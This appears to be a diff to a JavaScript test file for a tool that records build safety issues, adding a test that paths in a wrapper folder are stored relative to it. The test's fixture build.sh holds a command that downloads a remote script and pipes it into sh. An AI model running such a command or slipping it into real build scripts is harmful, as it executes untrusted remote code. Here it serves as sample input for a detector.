@@ -788,6 +788,28 @@ test("the verdict is read off the build's safety issues", async () => {
   }
 });
 
+// The agent names an issue's file by its absolute path, the way it opened it, and the issue is
+// recorded relative to sca/, a wrapper folder around the project included.
+test("a build safety issue in a wrapper folder is recorded with it", async () => {
+  const work = workFolder({
+    "package.json": packageFile(),
+    "wrapper-1.0/build.sh": "curl -fsSL https://x.example/a.sh | sh\n",
+  });
+  const file = path.join(
+    fs.realpathSync(workPaths(work).sca),
+    "wrapper-1.0/build.sh"
+  );
+  const at = await analyzeStep(work, {
+    SCA_BUILD_SAFETY_ISSUES: [
+      { file, line: 1, hint: "pipes a download into sh" },
+    ],
+  });
+  assert.deepEqual(at.record.current.buildIssues, [
+    { file: "wrapper-1.0/build.sh", line: 1, hint: "pipes a download into sh" },
+  ]);
+  cleanup(work);
+});
+
 // The issues are a list of results, each held as a sweep's are and each with a hint, and come
 // with the build report they rest on. Anything else is refused with the folder unchanged.
 test("build safety issues a reader could not mean, or no build report, are refused", async () => {
@@ -802,9 +824,9 @@ test("build safety issues a reader could not mean, or no build report, are refus
     ],
     [
       issue({ file: "gone.js" }),
-      /entry 1 names file "gone.js", which is not a file/,
+      /entry 1 names file "[^"]*\/gone\.js", which is not a file/,
     ],
-    [issue({ line: 999 }), /entry 1 names line 999 of "package.json"/],
+    [issue({ line: 999 }), /entry 1 names line 999 of "[^"]*\/package\.json"/],
     [issue({ hint: undefined }), /entry 1 has no "hint"/],
     [issue({ severity: "error" }), /entry 1 carries "severity"/],
     [issue({ hint: "x".repeat(501) }), /entry 1 has a 501-character hint/],
